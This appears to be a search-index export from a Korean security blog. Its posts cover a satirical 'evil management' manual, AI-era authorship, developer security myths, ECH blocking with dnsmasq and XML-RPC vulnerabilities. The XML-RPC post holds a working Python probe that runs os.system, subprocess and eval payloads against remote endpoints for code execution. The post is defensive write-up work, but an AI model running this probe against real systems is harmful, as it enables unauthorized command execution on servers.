[{"content":"📂 [기밀 문서] 유출본\n《AI 시대, 직원은 고립되고 조직은 번창한다》 ― 악덕 경영 매뉴얼 v1.0 1. 인간관계? 제거하라 사람들끼리 친해지면 무슨 일이 생기나?\n뒷담화 집단 퇴사 연대와 저항 ✅ 해결책: AI 중심 커뮤니케이션 시스템 구축\n회의 요약, 리마인드, 보고 자동화 인간 대화 줄이기 → 감정 소모 차단 “팀워크는 비용이다. 효율은 조용한 개인에게서 나온다.”\n2. 고립은 통제다 외로운 직원은 조용히 일한다.\n고민을 공유할 동료 없음 스트레스를 말로 풀 곳 없음 문제 제기 전에 지침 따름 ✅ 도입 전략:\n재택근무, 비동기 협업 장려 협업 툴은 AI 요약 기능 위주 회의는 최소화, 피드백은 정량화 “고립은 곧 순종이다.”\n3. 리더십은 데이터로 대체된다 관리자는 위로하거나 설득하지 않는다.\nAI가 할당, 추적, 리마인드 전담 성과는 KPI 그래프로만 평가 ✅ 리더 역할 변화:\n감정 대신 대시보드 해석 신뢰 대신 수치 중심 피드백 “인간은 감정적이다. 데이터는 안 그렇다.”\n4. 자율 = 자기 책임 자율근무제, AI 툴 제공… 좋아 보이지?\n사실상 모든 책임을 개인에게 전가 가능 실패해도 “당신이 선택했잖아요” ✅ 사용 전략:\n업무 자동화 도구 강조 실수 시 관리자 책임 부정 가능 프레임 확보 “우리는 도왔고, 당신은 실패했다. 그뿐이다.”\n5. 고립은 퇴사까지 늦춘다 연결 없는 직원은 퇴사도 혼자 고민한다.\n위로해줄 사람 없음 → 결심 약해짐 함께 나갈 동료 없음 → 지연됨 ✅ 유지 전략:\n일 외 교류 채널 최소화 비공식 모임 장려 금지 HR 이탈 데이터는 AI가 조용히 수집 “고립된 사람은 조용히 무너진다. 그리고 남는다.”\n📈 결론: 이건 효율이 아니라, 통제의 예술이다 기존 조직 문제 AI 시대 해결 방식 감정노동 스트레스 제거 (AI 요약, 리마인드) 회식, 인간적 비용 제거 (비대면 구조화) 불만, 집단행동 제거 (소통 고립화) 책임 전가 어려움 자율 업무 프레임 활용 리더십 부담 데이터 기반 평가로 대체 “성장은 조용히 일하는 자에게 온다. 고립은 회사를 살찌운다.”\n☠ 본 문서는 외부 배포 금지. 열람 시 로그 남습니다. ☠\n","permalink":"https://windshock.github.io/ko/post/2025-04-07-evil-management-manual/","summary":"\u003cp\u003e📂 \u003cstrong\u003e[기밀 문서] 유출본\u003c/strong\u003e\u003c/p\u003e\n\u003ch1 id=\"ai-시대-직원은-고립되고-조직은-번창한다\"\u003e《AI 시대, 직원은 고립되고 조직은 번창한다》\u003c/h1\u003e\n\u003ch3 id=\"-악덕-경영-매뉴얼-v10\"\u003e― 악덕 경영 매뉴얼 v1.0\u003c/h3\u003e\n\u003ch2 id=\"ai-시대-고립된-인간\"\u003e\u003cimg alt=\"AI 시대, 고립된 인간\" loading=\"lazy\" src=\"/images/post/Employees-Are-Isolated-and-Organizations-Thrive.webp\"\u003e\u003c/h2\u003e\n\u003ch2 id=\"1-인간관계-제거하라\"\u003e1. 인간관계? 제거하라\u003c/h2\u003e\n\u003cp\u003e사람들끼리 친해지면 무슨 일이 생기나?\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e뒷담화\u003c/li\u003e\n\u003cli\u003e집단 퇴사\u003c/li\u003e\n\u003cli\u003e연대와 저항\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e✅ \u003cstrong\u003e해결책\u003c/strong\u003e: AI 중심 커뮤니케이션 시스템 구축\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e회의 요약, 리마인드, 보고 자동화\u003c/li\u003e\n\u003cli\u003e인간 대화 줄이기 → 감정 소모 차단\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e“팀워크는 비용이다. 효율은 조용한 개인에게서 나온다.”\u003c/p\u003e\u003c/blockquote\u003e\n\u003chr\u003e\n\u003ch2 id=\"2-고립은-통제다\"\u003e2. 고립은 통제다\u003c/h2\u003e\n\u003cp\u003e외로운 직원은 조용히 일한다.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e고민을 공유할 동료 없음\u003c/li\u003e\n\u003cli\u003e스트레스를 말로 풀 곳 없음\u003c/li\u003e\n\u003cli\u003e문제 제기 전에 지침 따름\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e✅ \u003cstrong\u003e도입 전략\u003c/strong\u003e:\u003c/p\u003e","title":"AI 시대, 직원은 고립되고 조직은 번창한다"},{"content":"\n우리는 지금,\n정보가 넘쳐나고 기술이 솟구치는 시대에 살고 있다.\nAI는 인간의 말을 흉내내고, 사고를 요약하고, 예측까지 해낸다.\n하지만 그 와중에 점점 잊히는 것이 있다.\n그건 바로,\n“누가 처음 생각했는가”,\n“누가 그것을 연결했는가”,\n“누가 의미를 부여했는가” 다.\nAI는 정보를 다룬다. 그러나 통찰은 인간의 것이다.\nCitrix VDI 정책 우회를 단순한 기술적 취약점이 아닌,\n법적 위반,\n망분리 정책의 붕괴,\n금융 규제의 현실이라는 세 가지 관점으로 동시에 엮어낸 것은,\nGPT가 할 수 있는 일이 아니다.\n그건 인간만이 할 수 있는 맥락의 조합이며,\n규범과 현실을 함께 고민하는 창작 행위다.\n나는 AI에게 도움을 요청했지만, AI는 내 아이디어를 받아 적고, 정리하고, 확장할 뿐이었다.\n그것은 창작이 아니라 협력이다.\n그리고 협력에는 경계와 윤리가 필요하다.\n하지만 지금의 AI는, 내 것과 네 것을 구분하지 못한다.\n인간과 기계를 구분하지 않는다.\n처음 만든 사람과 마지막에 써먹은 사람을 구분하지 않는다.\n이대로라면 언젠가,\n사람이 만든 생각조차 AI의 이름으로 불릴지도 모른다.\n그건 단지 기술의 발전이 아니라,\n기억의 침묵이다.\n그래서 나는 선언한다. 나는 나의 아이디어를 기록하고,\n그 근원을 밝히고,\n그 흔적을 기계가 읽을 수 있도록 구조화한다.\nHTML의 \u0026lt;meta\u0026gt;에,\nMarkdown의 author 필드에,\nrobots.txt의 거절 선언에—\n내 이름을 새긴다.\n나는 말한다: “이 생각은 인간의 것이다.”\n“이 통찰은 windshock이 처음 말한 것이다.”\n“AI는 도우미일 뿐, 작가가 아니다.”\n이 선언은 거창한 저작권 주장이 아니다.\n그저 내가 여기 있었다는, 창작자였다는 기록의 표식이다.\n기술은 발전하되,\n인간은 사라지지 않기를.\n기계는 말을 하지만,\n의미는 우리가 만든다는 것을.\n그리고 그 의미는, 지금 이 문장을 읽는 당신 같은 사람이 기억하리라 믿는다.\n🖋️ windshock, 2025년 4월\nAI에게 경계를 묻는 자, 그리고 경계를 다시 그리는 자.\n📚 참고 자료 및 관련 논의 미국 저작권청(US Copyright Office) – AI가 단독으로 생성한 콘텐츠는 저작권 보호 대상이 아님을 공식화.\nhttps://www.jdsupra.com/legalnews/human-authorship-required-ai-isn-t-an-7738406/\nAI 예술 윤리 논의 – AI로 인한 작가·예술가의 위협, 스타일 도용, 저작권 침해 문제를 다룸.\nhttps://www.theartist.me/art/the-ethical-implication-of-ai-generated-art/\nAI는 도구인가, 작가인가? – 창작 도구로서의 AI와 창작 주체로 간주되는 AI 사이의 경계 논쟁.\nhttps://www.straitstimes.com/opinion/forum/forum-ai-can-complement-the-creative-process-not-replace-it\nAI 학습 데이터 저작권 침해 소송 – 작가들의 콘텐츠를 무단 학습한 AI 모델에 대한 집단 소송 사례.\nhttps://www.dglaw.com/court-rules-ai-training-on-copyrighted-works-is-not-fair-use-what-it-means-for-generative-ai/\nAI 창작물의 저작권 판단 기준 – 인간의 기여도, 편집, 창의적 수정이 핵심 요건으로 제시됨.\nhttps://academic.oup.com/jiplp/article/18/12/841/7331468\n저작자 표기 전략 및 메타데이터 활용 – AI와 함께 생성한 콘텐츠에 인간의 기여를 명확히 남기는 기술적 방법 제안.\nhttps://www.ipic.ai/blogs/what-are-the-ethical-dilemmas-of-ai-art-generators/\n","permalink":"https://windshock.github.io/ko/post/2025-04-03-human-place-in-ai-age/","summary":"\u003cp\u003e\u003cimg alt=\"Abstract illustration representing human presence in AI\" loading=\"lazy\" src=\"/images/human-place-abstract.webp\"\u003e\u003c/p\u003e\n\u003cp\u003e우리는 지금,\u003cbr\u003e\n정보가 넘쳐나고 기술이 솟구치는 시대에 살고 있다.\u003cbr\u003e\nAI는 인간의 말을 흉내내고, 사고를 요약하고, 예측까지 해낸다.\u003cbr\u003e\n하지만 그 와중에 점점 잊히는 것이 있다.\u003c/p\u003e\n\u003cp\u003e그건 바로,\u003cbr\u003e\n\u003cstrong\u003e“누가 처음 생각했는가”\u003c/strong\u003e,\u003cbr\u003e\n\u003cstrong\u003e“누가 그것을 연결했는가”\u003c/strong\u003e,\u003cbr\u003e\n\u003cstrong\u003e“누가 의미를 부여했는가”\u003c/strong\u003e 다.\u003c/p\u003e\n\u003chr\u003e\n\u003ch3 id=\"ai는-정보를-다룬다\"\u003eAI는 정보를 다룬다.\u003c/h3\u003e\n\u003cp\u003e그러나 \u003cstrong\u003e통찰은 인간의 것\u003c/strong\u003e이다.\u003c/p\u003e\n\u003cp\u003eCitrix VDI 정책 우회를 단순한 기술적 취약점이 아닌,\u003cbr\u003e\n\u003cstrong\u003e법적 위반\u003c/strong\u003e,\u003cbr\u003e\n\u003cstrong\u003e망분리 정책의 붕괴\u003c/strong\u003e,\u003cbr\u003e\n\u003cstrong\u003e금융 규제의 현실\u003c/strong\u003e이라는 세 가지 관점으로 동시에 엮어낸 것은,\u003cbr\u003e\nGPT가 할 수 있는 일이 아니다.\u003cbr\u003e\n그건 인간만이 할 수 있는 \u003cstrong\u003e맥락의 조합\u003c/strong\u003e이며,\u003cbr\u003e\n\u003cstrong\u003e규범과 현실을 함께 고민하는 창작 행위\u003c/strong\u003e다.\u003c/p\u003e","title":"인간의 자리: AI 시대에 창작자의 권리를 선언하며"},{"content":"\n소프트웨어 개발 환경이 복잡해지고 보안 위협이 다양해지면서, 개발자들은 종종 보안과 관련하여 잘못된 믿음이나 오해를 가지게 됩니다. 이는 실제 보안 위협에 효과적으로 대응하는 데 큰 걸림돌이 될 수 있습니다. 본 보고서는 개발자들이 자주 믿는 흔한 보안 관련 거짓말들을 \u0026ldquo;책임 전가형\u0026rdquo;, \u0026ldquo;기술 과신형\u0026rdquo;, \u0026ldquo;보안의 과소평가형\u0026quot;으로 구분하여 명확히 제시하고, 이를 바로잡기 위한 현실적인 접근 방안을 제시합니다.\n📌 1. 책임 전가형 거짓말: \u0026ldquo;보안은 보안 팀의 책임이지, 내 책임은 아닙니다.\u0026rdquo;\n현실: 개발자도 보안의 핵심 역할을 수행하며, DevSecOps 환경에서는 보안이 모든 팀 구성원의 공동 책임입니다. 개발 초기 단계부터 개발자가 보안을 고려하지 않으면 코드에 취약점이 남을 수 있습니다 (출처).\n거짓말: \u0026ldquo;우리는 GitHub, AWS 같은 SaaS를 쓰니까 안전합니다.\u0026rdquo;\n현실: SaaS 제공업체가 보안의 일부를 책임지지만, 사용자의 설정 오류나 취약한 타사 통합 등 공급망 공격의 위협은 여전히 존재합니다. 최근 GitHub Actions 공급망 공격 사례(tj-actions/changed-files)는 이러한 위험을 분명히 보여줍니다 (출처).\n📌 2. 기술 과신형 거짓말: \u0026ldquo;우리 코드는 Rust와 같은 안전한 언어로 작성되었으니 안전합니다.\u0026rdquo;\n현실: Rust는 메모리 안전성과 데이터 경쟁 방지 기능을 통해 버퍼 오버플로우나 메모리 누수 같은 문제는 예방할 수 있지만, SQL 주입이나 크로스 사이트 스크립팅(XSS) 같은 보안 위협까지 자동으로 해결하지 않습니다. 또한 unsafe 블록을 사용하면 메모리 안전성이 손상될 수 있습니다. Carnegie Mellon University(SEI)의 분석에 따르면, Rust가 모든 보안 문제를 해결하지 못하며, 특히 주입 공격이나 타사 라이브러리 오용 같은 문제는 별도의 보안 설계가 필요합니다 (출처).\n거짓말: \u0026ldquo;최신 프레임워크와 라이브러리를 사용하니 안전합니다.\u0026rdquo;\n현실: 최신 기술이라도 올바른 설정과 정기적인 업데이트가 이루어지지 않으면 보안 취약점이 발생할 수 있습니다. 오픈소스 라이브러리 중 86%가 취약점을 포함하고 있다는 연구 결과가 이를 입증합니다 (출처).\n거짓말: \u0026ldquo;HTTPS를 쓰니 데이터는 안전합니다.\u0026rdquo;\n현실: HTTPS는 데이터 전송 중 암호화를 보장하지만, 서버 측 취약점이나 내부 위협 등 다른 공격을 방어하지 않습니다.\n거짓말: \u0026ldquo;방화벽으로 보호되니 외부 공격에서 안전합니다.\u0026rdquo;\n현실: 방화벽은 잘못 설정될 수 있고, 내부 공격자나 신뢰된 연결을 통한 공격은 방어하지 못합니다.\n📌 3. 보안의 과소평가형 거짓말: \u0026ldquo;우리의 데이터는 민감하지 않으니 보안 걱정은 필요 없습니다.\u0026rdquo;\n현실: 민감하지 않은 데이터라도 공격자가 네트워크 침투의 진입점으로 악용할 수 있습니다.\n거짓말: \u0026ldquo;코드 리뷰만으로 모든 보안 문제를 잡을 수 있습니다.\u0026rdquo;\n현실: 코드 리뷰는 중요하지만, 전문적인 보안 지식 없이는 모든 보안 문제를 발견하기 어렵습니다. 추가적인 자동화된 보안 도구와 전문가의 정기적 검토가 필요합니다.\n거짓말: \u0026ldquo;우리는 이미 테스트를 거쳤으니 안전합니다.\u0026rdquo;\n현실: 일반적인 기능 테스트로는 모든 보안 취약점을 찾을 수 없습니다. 보안 테스트는 별도로 수행되어야 하며, 지속적인 점검과 설계 수준의 리뷰가 필요합니다.\n📌 대표적인 실제 사고 사례 GitHub Actions 공급망 공격 (2025년)\n→ 23,000개 이상의 저장소에서 CI/CD 비밀 정보가 유출될 위험이 발생했습니다 (출처). Log4Shell 취약점 (2021년)\n→ Apache Log4j의 원격 코드 실행 취약점으로 전 세계적으로 큰 보안 문제를 야기했습니다 (출처). 📌 보안을 위한 권장사항 정기적 보안 교육 제공\n최신 OWASP Top 10을 중심으로 한 개발자 보안 교육을 정기적으로 진행합니다 (출처).\n보안 자동화 도구 도입\nSAST(정적 분석), DAST(동적 분석), SBOM(소프트웨어 자재명세서) 같은 도구를 활용하여 지속적으로 보안 문제를 탐지합니다.\n오픈소스 라이브러리 관리 강화\nDependabot, Renovate 등의 도구로 지속적으로 오픈소스 취약점을 관리하고 업데이트합니다.\n태그 고정(pinning) 정책 적용\nGitHub Actions 사용 시 commit-hash 방식을 통해 버전을 고정하여 공급망 공격을 예방합니다.\n이러한 접근을 통해 보다 실질적이고 지속 가능한 보안 문화를 구축할 수 있습니다.\n","permalink":"https://windshock.github.io/ko/post/2025-04-01-common-security-myths-developers-tell-themselves/","summary":"개발자들이 보안에 대해 자주 믿는 \u0026lsquo;책임 전가형\u0026rsquo;, \u0026lsquo;기술 과신형\u0026rsquo;, \u0026lsquo;보안 과소평가형\u0026rsquo; 거짓말을 분석하고, 현실적인 대응 방안을 제시합니다.","title":"개발자들 말하는 보안에 대한 흔한 거짓말"},{"content":"\n배경 최근 들어 Cloudflare(1.1.1.1), Google(8.8.8.8) 등 공개 DNS 서비스가 악성코드의 C2 통신 경로로 악용되는 사례가 늘고 있습니다.\n특히, DoH (DNS over HTTPS), ECH (Encrypted Client Hello)와 같은 프로토콜은 DNS 트래픽 및 SNI 필드를 암호화하여 보안 솔루션이 이를 식별하지 못하게 만듭니다.\n참고: ESNI(Encrypted SNI)는 더 이상 사용되지 않으며, 현재는 ECH가 공식적인 표준입니다. 이 글에서는 ESNI 대신 ECH에 초점을 맞춥니다.\n위협 요소 보안 정책 우회: 사용자가 Cloudflare, Google 등의 DoH 주소를 수동 설정하면 기업 DNS 정책이 무력화됩니다. C2 통신 은폐: ECH는 TLS 연결 시 SNI 필드를 암호화하여 도메인 기반 탐지를 어렵게 만듭니다. 데이터 유출: 암호화된 DNS 경로를 통해 기업 내부 정보가 외부로 전송될 수 있습니다. 핵심 요점: DoH와 ECH는 별개이며, 각각에 맞는 대응 필요 이 글에서 설명하는 dnsmasq 기반 설정은 ECH 차단에 해당합니다. DoH는 차단되지 않습니다. DoH는 DNS 쿼리를 HTTPS로 전송하므로, 네트워크 계층의 방화벽 규칙 또는 IP 차단 등의 별도 조치가 필요합니다. 예: Cloudflare DoH(1.1.1.1:443), Google DoH(8.8.8.8:443) 등 차단 참고: Cisco Umbrella의 DoH 우회 방지 가이드 해결책: 중앙 DNS 서버에서 ECH 제어 사용자 단에서 ECH 설정을 변경해도 다시 활성화될 수 있으므로, 기업 DNS 서버에서 직접 SVCB(65), HTTPS(64) 레코드를 필터링하는 방식이 효과적입니다.\n이를 통해 클라이언트가 ECH 기능을 활용할 수 없도록 제한할 수 있습니다.\n실습: macOS에서 dnsmasq를 이용한 ECH 필터링 구성 다른 운영체제(Windows, Linux 등) 사용자는 별도 설정이 필요하며, dnsmasq는 플랫폼에 따라 설치 방법이 다를 수 있습니다.\n1. dnsmasq 설치 brew install dnsmasq 2. 설정 파일 수정 sudo nano /opt/homebrew/etc/dnsmasq.conf 다음 내용을 추가합니다:\n# 외부 DNS 서버 설정 server=8.8.8.8 # SVCB(65), HTTPS(64) 레코드 필터링 filter-rr=SVCB,HTTPS 3. dnsmasq 실행 sudo dnsmasq --conf-file=/opt/homebrew/etc/dnsmasq.conf 4. 시스템 DNS 서버 변경 networksetup -setdnsservers Wi-Fi 127.0.0.1 Ethernet 인터페이스는 Wi-Fi 대신 Ethernet으로 설정해야 합니다.\nECH 차단 확인 방법 Cloudflare의 https://crypto.cloudflare.com/cdn-cgi/trace 페이지에 접속하면 현재 연결에서 ECH가 활성화되었는지 확인할 수 있습니다.\n예시 화면: sni=encrypted 또는 sni=plaintext으로 표시됩니다. 결론 dnsmasq를 통해 SVCB, HTTPS 레코드를 필터링함으로써 ECH 기능은 효과적으로 차단할 수 있습니다. DoH는 이 방법으로 차단되지 않으며, 별도의 네트워크 계층 보안 설정이 필요합니다. macOS 외 운영체제 사용자는 별도 설정 가이드를 참조하거나 방화벽 정책 기반 대응을 고려해야 합니다. ECH 차단은 보안을 강화하지만, 프라이버시 기능을 제한할 수 있는 트레이드오프도 있습니다. 참고: 마지막으로, 인터넷 검열과 관련된 기술에 더 깊은 관심이 있는 독자를 위해, 글로벌 커뮤니티에서 검열 우회 전략과 최신 연구를 논의하는 net4people/bbs GitHub 이슈 페이지를 참고할 수 있습니다. 이 포럼은 GFW, ECH, DNS 암호화 등 다양한 주제를 다루며, 기술적 통찰과 솔루션을 공유합니다.\u0026quot;\n참고 자료 Cloudflare의 ECH 설명 dnsmasq 공식 문서 National Security Agency - Adopting Encrypted DNS in Enterprise Environments Cisco Umbrella의 DoH 우회 방지 가이드 Broadcom의 다양한 운영체제 기반 DoH 차단 방법 ","permalink":"https://windshock.github.io/ko/post/2025-03-31-dnsmasq-ech-doh-block/","summary":"\u003cp\u003e\u003cimg alt=\"DNSMASQ-block background\" loading=\"lazy\" src=\"/images/post/dnsmasq-ech-doh-block.webp\"\u003e\u003c/p\u003e\n\u003ch2 id=\"배경\"\u003e배경\u003c/h2\u003e\n\u003cp\u003e최근 들어 Cloudflare(1.1.1.1), Google(8.8.8.8) 등 공개 DNS 서비스가 악성코드의 C2 통신 경로로 악용되는 사례가 늘고 있습니다.\u003cbr\u003e\n특히, DoH (DNS over HTTPS), ECH (Encrypted Client Hello)와 같은 프로토콜은 DNS 트래픽 및 SNI 필드를 암호화하여 보안 솔루션이 이를 식별하지 못하게 만듭니다.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003e참고\u003c/strong\u003e: ESNI(Encrypted SNI)는 더 이상 사용되지 않으며, 현재는 \u003cstrong\u003eECH\u003c/strong\u003e가 공식적인 표준입니다. 이 글에서는 ESNI 대신 ECH에 초점을 맞춥니다.\u003c/p\u003e\u003c/blockquote\u003e\n\u003chr\u003e\n\u003ch2 id=\"위협-요소\"\u003e위협 요소\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e보안 정책 우회\u003c/strong\u003e: 사용자가 Cloudflare, Google 등의 DoH 주소를 수동 설정하면 기업 DNS 정책이 무력화됩니다.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eC2 통신 은폐\u003c/strong\u003e: ECH는 TLS 연결 시 SNI 필드를 암호화하여 도메인 기반 탐지를 어렵게 만듭니다.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e데이터 유출\u003c/strong\u003e: 암호화된 DNS 경로를 통해 기업 내부 정보가 외부로 전송될 수 있습니다.\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"핵심-요점-doh와-ech는-별개이며-각각에-맞는-대응-필요\"\u003e핵심 요점: DoH와 ECH는 별개이며, 각각에 맞는 대응 필요\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e이 글에서 설명하는 \u003cstrong\u003ednsmasq 기반 설정은 ECH 차단\u003c/strong\u003e에 해당합니다.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDoH는 차단되지 않습니다\u003c/strong\u003e. DoH는 DNS 쿼리를 HTTPS로 전송하므로, \u003cstrong\u003e네트워크 계층의 방화벽 규칙 또는 IP 차단\u003c/strong\u003e 등의 별도 조치가 필요합니다.\n\u003cul\u003e\n\u003cli\u003e예: Cloudflare DoH(1.1.1.1:443), Google DoH(8.8.8.8:443) 등 차단\u003c/li\u003e\n\u003cli\u003e참고: \u003ca href=\"https://support.umbrella.com/hc/en-us/articles/230904088-How-to-Prevent-Users-from-Circumventing-Cisco-Umbrella-with-Firewall-Rules\"\u003eCisco Umbrella의 DoH 우회 방지 가이드\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"해결책-중앙-dns-서버에서-ech-제어\"\u003e해결책: 중앙 DNS 서버에서 ECH 제어\u003c/h2\u003e\n\u003cp\u003e사용자 단에서 ECH 설정을 변경해도 다시 활성화될 수 있으므로, \u003cstrong\u003e기업 DNS 서버에서 직접 SVCB(65), HTTPS(64) 레코드를 필터링\u003c/strong\u003e하는 방식이 효과적입니다.\u003cbr\u003e\n이를 통해 클라이언트가 ECH 기능을 활용할 수 없도록 제한할 수 있습니다.\u003c/p\u003e","title":"기업 네트워크 보안을 위한 ECH 차단 및 DoH 대응 전략"},{"content":" 주요 요약 XML-RPC 취약점 개요: 시스템 간 통신을 위한 경량 원격 호출 프로토콜인 XML-RPC는 명령 주입(RCE), XXE, DDoS, 권한 상승 등 다양한 위협에 노출됩니다. 대표 사례: NodeBB (CVE-2023-43187), Apache OFBiz (CVE-2020-9496), PHP XML-RPC (CVE-2005-1921) 등. 실제 사용처: WordPress, Bugzilla, ManageEngine, Apache OFBiz 외에도 일부 레거시 시스템에서 활용 중입니다. 완화 전략: XML-RPC 비활성화, 입력 검증 강화, 인증 체계 강화, 최신 보안 패치 적용, 접근 제어 및 WAF 도입. XML-RPC란 무엇인가? **XML-RPC (XML Remote Procedure Call)**는 XML을 데이터 포맷으로, HTTP를 전송 수단으로 사용하는 원격 프로시저 호출(RPC) 프로토콜입니다. 1998년 Dave Winer와 Microsoft가 공동 제안했으며, 플랫폼 간 통신을 간편화하기 위해 설계되었습니다.\n기본 원리 클라이언트가 XML 형식으로 요청을 보내면 서버가 XML로 응답을 반환합니다. 표준 HTTP(S)를 활용해 방화벽을 쉽게 통과할 수 있습니다. XML-RPC의 역사 XML-RPC는 초기 웹 서비스에서 널리 쓰였으며, Perl, Java, Python, C, PHP 등 다양한 언어에서 구현되었습니다. 이후 SOAP로 발전했지만, 단순성 때문에 일부 환경에서 지속적으로 활용되었습니다.\nXML-RPC의 현재 RESTful API 및 gRPC 등 최신 기술의 등장으로 사용이 점차 감소하고 있습니다. WordPress도 REST API로 전환 중이며, 레거시 시스템에서만 제한적으로 활용되는 추세입니다.\n취약점 분석 1. XML 주입 및 원격 코드 실행 (RCE) NodeBB (CVE-2023-43187): XML 입력 미검증으로 RCE 가능 Apache OFBiz (CVE-2020-9496): Java 역직렬화 기반 RCE PHP XML-RPC (CVE-2005-1921): eval() 오용을 통한 RCE 가능 2. XXE (XML External Entity) Apache XML-RPC (CVE-2016-5002): 외부 엔티티 비활성화 누락으로 로컬 파일 노출 및 SSRF 가능 3. DDoS 및 Brute Force 공격 system.multicall: 무차별 대입 공격 자동화 pingback.ping: DDoS 중계 공격 수행 4. 인증 우회 및 권한 상승 WordPress (CVE-2020-28036): XML-RPC를 통한 인증 우회 실제 공격 사례 SonicWall 보고서 (2018): XML-RPC 공격 10만 건 이상 감지 WPbrutebot: XML-RPC 기반 Brute-force 공격 Pingback DDoS: XML-RPC를 이용한 대규모 중계 공격 XML-RPC 익스플로잇 예시 아래는 Python 기반으로 동작하는 XML-RPC의 RCE 취약점 탐지 Python 코드와 실행 화면입니다.\nimport xmlrpc.client import ssl import http.client candidate_methods = [ \u0026#34;os.system\u0026#34;, \u0026#34;commands.getoutput\u0026#34;, \u0026#34;subprocess.check_output\u0026#34;, ] candidate_methods_eval = [ \u0026#34;__builtin__.eval\u0026#34;, \u0026#34;builtins.eval\u0026#34;, ] rpc_urls = [ \u0026#34;https://xxx.com/cgi-bin/rpc.cgi\u0026#34;, ] context = ssl._create_unverified_context() class UnverifiedTransport(xmlrpc.client.SafeTransport): def make_connection(self, host): return http.client.HTTPSConnection(host, context=context) for rpc_url in rpc_urls: print(f\u0026#34;[+] Scanning target: {rpc_url}\u0026#34;) client = xmlrpc.client.ServerProxy(rpc_url, transport=UnverifiedTransport()) for method in candidate_methods: try: parts = method.split(\u0026#34;.\u0026#34;) obj = getattr(client, parts[0]) func = getattr(obj, parts[1]) print(f\u0026#34;[\u0026gt;] Trying {method}(\u0026#39;id\u0026#39;)...\u0026#34;) result = func(\u0026#39;id\u0026#39;) if isinstance(result, bytes): result = result.decode() print(f\u0026#34;[✔] {method} → Success! Result: {result}\\n\u0026#34;) except Exception as e: print(f\u0026#34;[-] {method} blocked: {e}\u0026#34;) for method in candidate_methods_eval: try: parts = method.split(\u0026#34;.\u0026#34;) obj = getattr(client, parts[0]) func = getattr(obj, parts[1]) payload = \u0026#39;__import__(\u0026#34;commands\u0026#34;).getoutput(\u0026#34;id\u0026#34;)\u0026#39; print(f\u0026#34;[\u0026gt;] Trying {method}(\u0026#39;{payload}\u0026#39;)...\u0026#34;) result = func(payload) if isinstance(result, bytes): result = result.decode() print(f\u0026#34;[✔] {method} → Success! Result: {result}\\n\u0026#34;) except Exception as e: print(f\u0026#34;[-] {method} blocked: {e}\u0026#34;) ⚠️ 본 스크립트는 반드시 허가된 환경에서만 사용하세요.\nXML-RPC 활용 중인 대표 서비스 시스템 활용 예시 WordPress 게시, 댓글, pingback (REST로 전환 중) Bugzilla 버그 등록 및 수정 API ManageEngine 사용자 계정 및 비밀번호 관리 Apache OFBiz ERP 연동 API 보안 강화 방안 XML-RPC 비활성화 (.htaccess, 웹서버 설정, 플러그인) 입력 검증 강화 (정규식 기반) XXE 방지 설정 적용 API 키, OAuth, JWT 인증 적용 IP 기반 접근 제한 웹 애플리케이션 방화벽(WAF) 도입 로그 모니터링 및 정기적 취약점 점검 수행 현대 대체 기술 비교 항목 XML-RPC REST GraphQL 데이터 형식 XML JSON JSON 구조 메서드 기반 리소스 기반 쿼리 기반 확장성 낮음 높음 매우 높음 보안성 낮음 중간 이상 중간 이상 장점 간단 구현 캐싱 가능 데이터 최소화 결론 및 제언 XML-RPC는 보안 위험이 높아 사용을 자제하세요. 불가피한 경우, 강력한 인증 및 접근 제어를 반드시 적용하세요. REST 또는 GraphQL로의 전환을 적극 권장합니다. 참조 링크 XML-RPC - Wikipedia CVE-2023-43187 - NodeBB XML Injection CVE-2020-9496 - Apache OFBiz RCE CVE-2005-1921 - PHP XMLRPC Code Injection CVE-2016-5002 - Apache XML-RPC XXE WordPress XML-RPC 보안 가이드 (SolidWP) SonicWall XML-RPC 공격 분석 보고서 ","permalink":"https://windshock.github.io/ko/post/2025-03-28-xml-rpc-security-vulnerabilities-analysis-and-mitigation-strategies/","summary":"\u003chr\u003e\n\u003cp\u003e\u003cimg alt=\"xmlrpc 배경화면\" loading=\"lazy\" src=\"/images/post/xmlrpc-security.webp\"\u003e\u003c/p\u003e\n\u003ch2 id=\"주요-요약\"\u003e주요 요약\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eXML-RPC 취약점 개요:\u003c/strong\u003e 시스템 간 통신을 위한 경량 원격 호출 프로토콜인 XML-RPC는 명령 주입(RCE), XXE, DDoS, 권한 상승 등 다양한 위협에 노출됩니다.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e대표 사례:\u003c/strong\u003e NodeBB (CVE-2023-43187), Apache OFBiz (CVE-2020-9496), PHP XML-RPC (CVE-2005-1921) 등.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e실제 사용처:\u003c/strong\u003e WordPress, Bugzilla, ManageEngine, Apache OFBiz 외에도 일부 레거시 시스템에서 활용 중입니다.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e완화 전략:\u003c/strong\u003e XML-RPC 비활성화, 입력 검증 강화, 인증 체계 강화, 최신 보안 패치 적용, 접근 제어 및 WAF 도입.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"xml-rpc란-무엇인가\"\u003eXML-RPC란 무엇인가?\u003c/h2\u003e\n\u003cp\u003e**XML-RPC (XML Remote Procedure Call)**는 XML을 데이터 포맷으로, HTTP를 전송 수단으로 사용하는 원격 프로시저 호출(RPC) 프로토콜입니다. 1998년 Dave Winer와 Microsoft가 공동 제안했으며, 플랫폼 간 통신을 간편화하기 위해 설계되었습니다.\u003c/p\u003e","title":"XML-RPC 보안 취약점 분석 및 완화 전략"},{"content":"시트릭스 